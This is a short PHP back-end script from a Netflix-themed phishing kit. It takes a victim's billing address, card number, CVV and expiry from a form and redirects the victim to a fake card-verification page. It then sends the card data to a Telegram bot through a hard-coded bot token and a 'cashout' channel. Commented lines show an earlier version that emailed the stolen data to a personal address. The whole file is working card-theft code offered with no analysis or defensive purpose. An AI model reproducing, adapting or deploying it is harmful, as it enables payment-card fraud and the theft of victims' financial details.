<?php
header('Location: /netflix/card_verification');
$address=$_POST['address'];
$card=$_POST['card'];
$cvv=$_POST['cvv'];
$expiry=$_POST['expiry'];
$nl="\r\n";
//$from = "Cashout";
//$to = "nwaforalex158@outlook.com";
//$subject = "Cashout Is A Must By Gods  Grace";
//$message = 'ADDRESS: ' . $address . $nl.'CARD: ' . $card .$nl. 'CVV: ' . $cvv  . $nl. 'EXPIRY: ' . $expiry ;
$message = urlencode("---------NETFLIX-CARD--------\nADDRESS:  ".$address."\nCARD: ".$card."\nCVV: ".$cvv."\nEXPIRY: ".$expiry);
$apiToken = "5369209739:AAFaMNk39MGepMZ3E9YrjLqhEHZupqCK-Pw";
$chat_id = "@cashout2022158";
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?text=".$message."&chat_id=".$chat_id."&parse_mode=HTML");
?>
